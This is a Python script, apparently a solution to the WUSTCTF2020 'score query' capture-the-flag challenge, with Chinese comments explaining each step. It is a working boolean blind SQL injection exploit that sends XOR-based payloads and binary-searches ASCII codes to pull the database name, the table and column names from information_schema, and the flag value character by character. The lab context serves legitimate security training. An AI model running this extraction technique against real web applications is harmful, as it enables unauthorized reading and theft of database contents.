import requests
import time
'''
[WUSTCTF2020]颜值成绩查询
https://www.cnblogs.com/x1x20z/p/12901092.html
'''
url = "http://14145c5d-cfe0-4b86-a1fe-95e9239c8975.node5.buuoj.cn:81/?stunum=1"
res = ''
for i in range(1,50):#循环从1到49，对应要提取的数据字段的第1到第49个字符。上限设为50是假设flag长度不超过50个字符。
    print(i)
    left = 31
    right = 127
    mid = left + ((right - left)>>1)
    while left < right:        
        #payload = "^(ascii(substr(database(),{},1))>{})".format(i,mid)
        #payload = "^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='ctf'),{},1))>{})".format(i,mid)
        #payload = "^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name)='flag'),{},1))>{})".format(i,mid)
        payload = "^(ascii(substr((select(value)from(flag)),{},1))>{})".format(i,mid)
        '''构造布尔盲注的SQL注入条件，这是最核心的注入部分：
        ^是XOR运算符，在MySQL中常用于布尔表达式
        substr((select(value)from(flag)),{},1)从flag表的value字段提取第i个字符
        ascii(...)将字符转换为ASCII码值
        >{}判断ASCII值是否大于中间值mid
        .format(i,mid)将位置i和中间值mid填入占位符
        '''
        r = requests.get(url=url+payload)
        if r.status_code == 429:
            print('too fast')
            time.sleep(1)
        if 'Hi admin, your score is: 100' not in r.text:#=输入1，证明语句为真，值比mid大
            left = mid + 1
        elif 'Hi admin, your score is: 100'  in r.text:#比mid小
            right = mid 
        mid = left + ((right-left)>>1)
    if mid == 31 or mid == 127:
        break    
    res += chr(mid)
    print(str(mid),res)
#库名 ctf 
#表名 flag,score
#flag表中的列名 flag,value